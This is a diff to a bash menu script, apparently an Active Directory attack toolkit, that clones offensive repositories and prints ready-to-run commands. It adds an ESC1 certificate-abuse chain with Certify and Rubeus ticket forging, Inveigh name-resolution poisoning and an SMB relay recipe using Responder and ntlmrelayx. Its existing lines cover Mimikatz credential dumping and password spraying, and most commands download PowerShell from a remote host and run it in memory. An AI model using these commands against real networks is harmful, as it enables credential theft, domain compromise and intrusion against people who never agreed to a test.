@@ -68,6 +68,7 @@ DomainPasswordSprayRepo="https://raw.githubusercontent.com/dafthack/DomainPasswo
 EmpireRepo="https://raw.githubusercontent.com/BC-SECURITY/Empire/master/empire/server/data/module_source/";
 GetSystemTechniquesRepo="https://raw.githubusercontent.com/S3cur3Th1sSh1t/Get-System-Techniques/master/";
 Group3rRepo="https://github.com/Group3r/Group3r/releases/download/1.0.41/Group3r.exe";
+InveighRepo="https://raw.githubusercontent.com/Kevin-Robertson/Inveigh/master/Inveigh.ps1";
 JAWSRepo="https://raw.githubusercontent.com/411Hall/JAWS/master/";
 LazagneRepo="https://github.com/AlessandroZ/LaZagne/releases/download/2.4.3/lazagne.exe";
 NishangRepo="https://raw.githubusercontent.com/samratashok/nishang/master/";
@@ -77,7 +78,6 @@ PowersploitRepo="https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/m
 PowersploitRepo="https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/";
 S3cur3Th1sSh1tCredsRepo="https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/";
 SecListsRepo="https://github.com/danielmiessler/SecLists/";
-WinPwnRepo="https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/master/";
 
 
 LocalRepo="False"
@@ -96,14 +96,17 @@ cd $HOME/ADAT
 # Set local repo locations in the ADAT folder.
 
 BloodHoundLocalRepo="$HOME/ADAT/BloodHound"
+Certificate="$HOME/ADAT/LocalRepo"
+DomainPasswordSprayLocalRepo="$HOME/ADAT/DomainPasswordSpray"
 EmpireLocalRepo="$HOME/ADAT/Empire"
 GetSystemTechniquesLocalRepo="$HOME/ADAT/Get-System-Techniques"
+InveighLocalRepo="$HOME/ADAT/Inveigh"
 JAWSLocalRepo="$HOME/ADAT/JAWS"
 NishangLocalRepo="$HOME/ADAT/nishang"
 PowerSharpPackLocalRepo="$HOME/ADAT/PowerSharpPack"
 PowerSploitLocalRepo="$HOME/ADAT/PowerSploit"
 PowersploitLocalRepo="$HOME/ADAT/Powersploit"
-WinPwnLocalRepo="$HOME/ADAT/WinPwn"
+S3cur3Th1sSh1tCredsLocalRepo="$HOME/ADAT/S3cur3Th1sSh1t"
 
 
 if [ -d "$EmpireLocalRepo" ] 
@@ -147,21 +150,6 @@ else
 	echo -e ""
 	echo -e "${LGREEN}Cloning PowerSploit Repo${RESTORE}"
 	git clone --recursive "https://github.com/PowerShellMafia/PowerSploit.git" $HOME/ADAT/PowerSploit
-	echo -e ""
-fi
-
-
-if [ -d "$WinPwnLocalRepo" ] 
-then
-	echo -e ""
-    	echo -e "WinPwn is installed, checking if updated to latest version."
-    	cd $WinPwnLocalRepo
-    	git pull "https://github.com/S3cur3Th1sSh1t/WinPwn.git"
- 	echo -e ""
-else
-	echo -e ""
-	echo -e "${LGREEN}Cloning WinPwn Repo${RESTORE}"
-	git clone --recursive "https://github.com/S3cur3Th1sSh1t/WinPwn.git" $HOME/ADAT/WinPwn
 	echo -e ""
 fi
 
@@ -221,7 +209,7 @@ else
 	echo -e ""
 fi
 
-if [ -d "$PowerSharpPackRepo" ]
+if [ -d "$PowerSharpPackLocalRepo" ]
 then
 	echo -e ""
     	echo -e "PowerSharpPack is installed, checking if updated to latest version."
@@ -235,6 +223,48 @@ else
 	echo -e ""
 fi
 
+if [ -d "$InveighLocalRepo" ]
+then
+	echo -e ""
+    	echo -e "Inveigh is installed, checking if updated to latest version."
+    	cd $InveighLocalRepo
+    	git pull "https://github.com/Kevin-Robertson/Inveigh.git"
+ 	echo -e ""
+else
+	echo -e ""
+	echo -e "${LGREEN}Cloning Inveigh Repo${RESTORE}"
+	git clone --recursive "https://github.com/Kevin-Robertson/Inveigh.git" $HOME/ADAT/Inveigh
+	echo -e ""
+fi
+
+if [ -d "$DomainPasswordSprayLocalRepo" ]
+then
+	echo -e ""
+    	echo -e "DomainPasswordSpray is installed, checking if updated to latest version."
+    	cd $DomainPasswordSprayLocalRepo
+    	git pull "https://github.com/dafthack/DomainPasswordSpray.git"
+ 	echo -e ""
+else
+	echo -e ""
+	echo -e "${LGREEN}Cloning DomainPasswordSpray Repo${RESTORE}"
+	git clone --recursive "https://github.com/dafthack/DomainPasswordSpray.git" $HOME/ADAT/DomainPasswordSpray
+	echo -e ""
+fi
+
+if [ -d "$S3cur3Th1sSh1tCredsLocalRepo" ]
+then
+	echo -e ""
+    	echo -e "S3cur3Th1sSh1tCreds is installed, checking if updated to latest version."
+    	cd $S3cur3Th1sSh1tCredsLocalRepo
+    	git pull "https://github.com/S3cur3Th1sSh1t/Creds.git"
+ 	echo -e ""
+else
+	echo -e ""
+	echo -e "${LGREEN}Cloning S3cur3Th1sSh1tCreds Repo${RESTORE}"
+	git clone --recursive "https://github.com/S3cur3Th1sSh1t/Creds.git" $HOME/ADAT/S3cur3Th1sSh1tCreds
+	echo -e ""
+fi
+
 # Copy local repo contents to single folder
 
 cp -r $HOME/ADAT/BloodHound/* $HOME/ADAT/LocalRepo
@@ -243,9 +273,11 @@ cp -r $HOME/ADAT/Get-System-Techniques/* $HOME/ADAT/LocalRepo
 cp -r $HOME/ADAT/JAWS/* $HOME/ADAT/LocalRepo
 cp -r $HOME/ADAT/PowerSploit/* $HOME/ADAT/LocalRepo
 cp -r $HOME/ADAT/Powersploit/* $HOME/ADAT/LocalRepo
-cp -r $HOME/ADAT/WinPwn/* $HOME/ADAT/LocalRepo
 cp -r $HOME/ADAT/nishang/* $HOME/ADAT/LocalRepo
 cp -r $HOME/ADAT/PowerSharpPack/* $HOME/ADAT/LocalRepo
+cp -r $HOME/ADAT/Inveigh/* $HOME/ADAT/LocalRepo
+cp -r $HOME/ADAT/DomainPasswordSpray/* $HOME/ADAT/LocalRepo
+cp -r $HOME/ADAT/S3cur3Th1sSh1tCreds/* $HOME/ADAT/LocalRepo
 
 # Set script repo locations to local IP and Port
 
@@ -261,6 +293,8 @@ GetSystemTechniquesRepo="http://$LocalIP:$LocalPort/"
 BloodHoundRepo="http://$LocalIP:$LocalPort/"
 PowersploitRepo="http://$LocalIP:$LocalPort/"
 PowerSharpPackRepo="http://$LocalIP:$LocalPort/"
+InveighRepo="http://$LocalIP:$LocalPort/"
+DomainPasswordSprayRepo="http://$LocalIP:$LocalPort/"
 LocalRepo="True"
 
 }
@@ -298,6 +332,7 @@ echo -e "${YELLOW}The following variables have been set${RESTORE}"
 echo -ne "
 LocalIP		:	$LocalIP
 LocalPort	:	$LocalPort
+
 "
 
 echo -e "${YELLOW}Checking if Repositories are updated${RESTORE}"
@@ -513,22 +548,53 @@ echo -e ""
 echo -e ""      
 echo -e "${LGREEN}Certificate Services${RESTORE}"
 echo -e ""
-echo -e "${LGREEN}Enumerate Vulnerable Templates${RESTORE}"
+echo -e "Note: If a Domain Admin is in a Protected Users group, the exploit may not work as intended. Check before choosing a DA to target."
+echo -e ""
+echo -e "${LBLUE}#1: Load Invoke-Certify into memory${RESTORE}"
+echo -e "$DownloadMethod "$PowerSharpPackRepo"PowerSharpBinaries/Invoke-Certify.ps1);Invoke-Certify"
+echo -e ""
+echo -e "${LBLUE}#2: Enumerate Vulnerable Templates${RESTORE}"
+echo -e ""
 echo -e "${YELLOW}Find vulnerable templates using default low-privileged group${RESTORE}"
-echo -e "$DownloadMethod "$PowerSharpPackRepo"PowerSharpBinaries/Invoke-Certify.ps1);Invoke-Certify find /vulnerable"
+echo -e "Invoke-Certify find /vulnerable"
 echo -e  ""
 echo -e "${YELLOW}Find vulnerable templates using all groups the current user context is a part of${RESTORE}"
-echo -e "$DownloadMethod "$PowerSharpPackRepo"PowerSharpBinaries/Invoke-Certify.ps1);Invoke-Certify find /vulnerable /currentuser"
+echo -e "Invoke-Certify find /vulnerable /currentuser"
 echo -e ""
 echo -e ""
-echo -e "${LGREEN}Request Vulnerable Templates (Choose One)${RESTORE}"
+echo -e "${LBLUE}#3: Request Vulnerable Templates (Choose One)${RESTORE}"
 echo -e ""
-echo -e "${YELLOW}EC1 SubjectAltName (SAN)${RESTORE}"
-echo -e "$DownloadMethod "$PowerSharpPackRepo"PowerSharpBinaries/Invoke-Certify.ps1);Invoke-Certify request /ca:[CA Name] /template:[Template Name] /altname:[User]"
+echo -e "${YELLOW}ESC1 SubjectAltName (SAN)${RESTORE}"
+echo -e "Invoke-Certify request /ca:[CA Name] /template:[Template Name] /altname:[User]"
 echo -e ""
 echo -e ""
-echo -e "${LGREEN}Once requested convert on Unix device${RESTORE}"
+echo -e "${LBLUE}#4: Once requested convert on Unix device${RESTORE}"
 echo -e "openssl pkcs12 -in cert.pem -keyex -CSP "\"Microsoft Enhanced Cryptographic Provider v1.0"\" -export -out cert.pfx"
+echo -e ""
+echo -e "${LBLUE}#5: Move the file from Linux back to the Windows system${RESTORE}"
+echo -e ""
+echo -e "${LBLUE}#6: Load Invoke-Rubeus into memory${RESTORE}"
+echo -e "$DownloadMethod "$EmpireRepo"credentials/Invoke-Rubeus.ps1);Invoke-Rubeus"
+echo -e ""
+echo -e "${LBLUE}#7: Request a TGT with the altname and certificate${RESTORE}"
+echo -e "Invoke-Rubeus -Command "\"asktgt /user:administrator /certificate:cert.pfx /password:Password /nowrap"\""
+echo -e ""
+echo -e "${LBLUE}#8: Load the Base64 encoded ticket into current PowerShell session${RESTORE}"
+echo -e "Invoke-Rubeus -Command "\"ptt /ticket:doIF9jCCBfKgA..[Snip]"\""
+
+echo -ne  "Return to Previous Menu?
+
+       
+        Q)  ->	[Previous Menu		    ]
+"
+
+        read a
+        case $a in
+        	q|Q)	Internal_Menu_Main ;;
+		0) exit 0 ;;
+		*) echo -e "Wrong option."
+        esac
+        
 }
 
 
@@ -680,7 +746,7 @@ echo -e "${IBLUE}Mimikatz${RESTORE}"
 echo -e "$DownloadMethod "$EmpireRepo"credentials/Invoke-Mimikatz.ps1);Invoke-Mimikatz -DumpCreds"
 echo -e ""
 echo -e "${IBLUE}Nanodump${RESTORE}"
-echo -e "$DownloadMethod "$PowerSharpPackRepo"Invoke-NanoDump.ps1);Invoke-NanoDump"
+echo -e "$DownloadMethod "$PowerSharpPackRepo"PowerSharpBinaries/Invoke-NanoDump.ps1);Invoke-NanoDump"
 echo -e ""
 echo -e "${IBLUE}SharpSecDump${RESTORE}"
 echo -e "$DownloadMethod "$PowerSharpPackRepo"PowerSharpBinaries/Invoke-SharpSecDump.ps1);Invoke-SharpSecDump -Command "\"-target=127.0.0.1"\""
@@ -759,9 +825,9 @@ echo -e "${IBLUE}Nishang${RESTORE}"
 echo -e "$DownloadMethod '$NishangRepo""Gather/Get-PassHashes.ps1');Get-PassHashes"
 echo -e ""
 echo -e "${IBLUE}SharpSecDump${RESTORE}"
-echo -e "$DownloadMethod "$PowerSharpPackRepo"PowerSharpBinaries/Invoke-SharpSpray.ps1);Invoke-SharpSecDump -Command "\"-target=127.0.0.1"\""
-echo -e "$DownloadMethod "$PowerSharpPackRepo"PowerSharpBinaries/Invoke-SharpSpray.ps1);Invoke-SharpSecDump -Command "\"-target=10.10.10.10,10.10.10.20"\""
-echo -e "$DownloadMethod "$PowerSharpPackRepo"PowerSharpBinaries/Invoke-SharpSpray.ps1);Invoke-SharpSecDump -Command "\"-target=10.10.10.10 -u=admin -p=pass -d=security.local"\""
+echo -e "$DownloadMethod "$PowerSharpPackRepo"PowerSharpBinaries/Invoke-SharpSecDump.ps1);Invoke-SharpSecDump -Command "\"-target=127.0.0.1"\""
+echo -e "$DownloadMethod "$PowerSharpPackRepo"PowerSharpBinaries/Invoke-SharpSecDump.ps1);Invoke-SharpSecDump -Command "\"-target=10.10.10.10,10.10.10.20"\""
+echo -e "$DownloadMethod "$PowerSharpPackRepo"PowerSharpBinaries/Invoke-SharpSecDump.ps1);Invoke-SharpSecDump -Command "\"-target=10.10.10.10 -u=admin -p=pass -d=security.local"\""
 echo -e ""
 echo -e ""
 
@@ -1732,9 +1798,54 @@ echo -ne  "Return to Previous Menu?
 
 Internal_Menu_MiTM_Attacks(){
 
-echo "test"
+	clear
+    
+echo -e ""
+echo -e ""
+echo -e ""
+echo -ne " Select MiTM Type
 
 
+
+        1)  ->  [ Inveigh		]
+                
+        Q)  ->	[ Previous Menu		]
+"
+
+        read a
+        case $a in
+                1) 	Internal_Menu_MiTM_Inveigh ;;
+        	q|Q)	Internal_Menu_MiTM_Attacks ;;
+		0) exit 0 ;;
+		*) echo -e "Wrong option."
+        esac
+}
+
+Internal_Menu_MiTM_Inveigh(){
+
+    clear
+    
+echo -e ""
+echo -e ""
+echo -e ""
+echo -e "${LGREEN}Inveigh${RESTORE}"
+echo -e ""
+echo -e "$DownloadMethod "$InveighRepo"Inveigh.ps1);Invoke-Inveigh Y -NBNS Y -mDNS Y -HTTPS N -Proxy Y -IP [Host-IP]"
+echo -e ""
+
+echo -ne  "Return to Previous Menu?
+
+    
+        Q)  ->	[Previous Menu		    ]
+"
+
+        read a
+        case $a in
+        	q|Q) 	Internal_Menu_MiTM_Attacks ;;
+		0) exit 0 ;;
+		*) echo -e "Wrong option."
+        esac
+        
 
 }
 
@@ -1762,7 +1873,7 @@ echo -e "$DownloadMethod "$EmpireRepo"credentials/Invoke-Rubeus.ps1);Invoke-Rube
 echo -e ""
 echo -e "${IBLUE}SharpSpray${RESTORE}"
 echo -e "$DownloadMethod "$PowerSharpPackRepo"PowerSharpBinaries/Invoke-SharpSpray.ps1);Invoke-SharpSpray"
-echo -e "$DownloadMethod "$PowerSharpPackRepo"PowerSharpBinaries/Invoke-SharpSpray.ps1);Invoke-SharpSpray --Passwords Password1,PAsSW0rd,Qwerty123"
+echo -e "$DownloadMethod "$PowerSharpPackRepo"PowerSharpBinaries/Invoke-SharpSpray.ps1);Invoke-SharpSpray -Command "\"--Passwords Password1,PAsSW0rd,Qwerty123"\""
 echo -e ""
 echo -e ""
 
@@ -1845,13 +1956,14 @@ echo -ne " What would you like to do?
 	3)  ->	[ Impacket	]
 	4)  ->	[ Kerberos	]
 	5)  ->	[ LDAP		]
-	6)  ->	[ MSSQL		]
-	7)  ->	[ NTP		]
-	8)  ->	[ Nmap		]
-	9)  ->	[ Pywerview	]
-	10) -> 	[ RDP		]
-	11) ->	[ SMB		]
-	12) ->	[ WinRM		]
+	6)  ->	[ MiTM Attacks	]
+	7)  ->	[ MSSQL		]
+	8)  ->	[ NTP		]
+	9)  ->	[ Nmap		]
+	10)  ->	[ Pywerview	]
+	11) -> 	[ RDP		]
+	12) ->	[ SMB		]
+	13) ->	[ WinRM		]
 	
 	Q)  -> 	[ Options	]
         
@@ -1863,13 +1975,14 @@ echo -ne " What would you like to do?
                 3)	External_Menu_Impacket ;;
                 4) 	External_Menu_Kerberos ;;
                 5)	External_Menu_LDAP ;;
-                6)	External_Menu_MSSQL ;;
-                7)	External_Menu_NTP ;;
-                8)	External_Menu_Nmap ;;
-                9)	External_Menu_Pyerview ;;
-                10)	External_Menu_RDP ;;
-                11)	External_Menu_SMB ;;
-                12)	External_Menu_WinRM ;;
+                6)	External_Menu_MiTM ;;
+                7)	External_Menu_MSSQL ;;
+                8)	External_Menu_NTP ;;
+                9)	External_Menu_Nmap ;;
+                10)	External_Menu_Pyerview ;;
+                11)	External_Menu_RDP ;;
+                12)	External_Menu_SMB ;;
+                13)	External_Menu_WinRM ;;
                 q|Q)	External_Menu_Options ;;
 		0) exit 0 ;;
 		*) echo -e "Wrong option."
@@ -2102,6 +2215,84 @@ echo -ne  "Return to Previous Menu?
         esac
         
 }
+
+
+External_Menu_MiTM(){
+
+	clear
+
+echo -e ""
+echo -e ""
+echo -e ""
+echo -ne " What would you like to do?
+
+
+	1)  ->  [ SMB Relaying	]
+	
+	Q)  ->	[ Previous Menu	]
+
+        
+"
+        read a
+        case $a in
+                1) 	External_Menu_MiTM_SMB;;
+                q|Q)	External_Menu_Main ;;
+		0) exit 0 ;;
+		*) echo -e "Wrong option."
+        esac
+        
+}
+
+
+External_Menu_MiTM_SMB(){
+
+	clear
+
+echo -e ""
+echo -e ""
+echo -e ""
+echo -e "${LGREEN}SMB Relay${RESTORE}"
+echo -e ""
+echo -ne "${IBLUE}General Requirements${RESTORE}
+- SMB Signing disabled on target
+- Must be on the local network
+- User credentials must have remote login access (local admin to the target machine or member of the Domain Administrators group).
+"
+echo -e ""
+echo -ne "${IBLUE}Responder.conf configuration${RESTORE}
+- SMB = Off
+"
+echo -e ""
+echo -e "${IBLUE}#3: Check which systems do not require smb signing${RESTORE}"
+echo -e "crackmapexec smb 10.10.10.0/24 --gen-relay-list targets-to-relay.txt"
+echo -e "nmap --script=smb2-security-mode.nse -p 445 10.10.10.0/24 -Pn --open -oA targets-to-relay.txt"
+echo -e ""
+echo -e "${IBLUE}#2: Set Responder to reylay to identified systems${RESTORE}"
+echo -e "sudo python3 Responder.py -I eth0 -v"
+echo -e ""
+echo -e "${IBLUE}#3: Set ntlmrelayx.py to relay NTLM hashes to identified systems${RESTORE}"
+echo -e "sudo ntlmrelayx.py -t [IP] -smb2support --no-http-server"
+echo -e "sudo ntlmrelayx.py -tf [TargetsFile] -smb2support --no-http-server"
+echo -e ""
+echo -e ""
+echo -e ""
+
+echo -ne  "Return to Previous Menu?
+
+    
+        Q)  ->	[Previous Menu		    ]
+"
+
+        read a
+        case $a in
+        	q|Q) 	External_Menu_MiTM ;;
+		0) exit 0 ;;
+		*) echo -e "Wrong option."
+        esac
+
+}
+
+
 
 
 External_Menu_MSSQL(){
